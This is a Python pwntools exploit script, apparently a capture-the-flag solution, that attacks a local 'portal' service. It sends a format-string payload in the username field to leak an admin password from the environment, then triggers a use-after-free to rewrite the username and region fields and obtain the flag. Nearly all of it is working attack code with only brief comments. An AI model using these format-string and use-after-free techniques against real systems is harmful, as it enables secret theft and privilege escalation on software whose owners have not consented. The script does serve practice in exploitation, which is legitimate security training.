from pwn import *

context.log_level = 'error'
io = remote("127.0.0.1", 8000)
# io = process("./portal")

def login(username, password=None):
	io.sendlineafter(b">> ", b"1")
	io.sendlineafter(b"Username: ", str(username).encode())
	if password: io.sendlineafter(b"Password: ", str(password).encode())

def extract_password():
	offset = 93 # fuzz.py
	login(f"%{offset}$s")
	io.recvuntil(b"ADMIN_PASSWORD=")
	return io.recvline()[:-1].decode()

def insert(field, item=None):
	io.sendline(str(field).encode())
	if item: io.sendline(str(item).encode())

def free(): io.sendline(b"6")

# # Step-1 : Leak Admin Password from ENV
admin_pass = extract_password()
print("Leaked admin_pass: %s" % admin_pass)
login("admin", admin_pass)
ln = io.recvline().decode()
print(ln)

# Step-2 : Exploit Use-After Free to overwrite username with region
# and then modify region to match ADMINISTRATOR and get the flag.

REGION = "ADMINISTRATOR"
USERNAME = "admin"

free()
insert(2, REGION)     # UaF -> username -> REGION
insert(2, admin_pass) # UaF -> username -> PASSWORD
insert(2, USERNAME)   # Once both REGION and PASSWORD set: setting the username back to admin.
insert(5)             # This gets us the flag:
io.interactive()
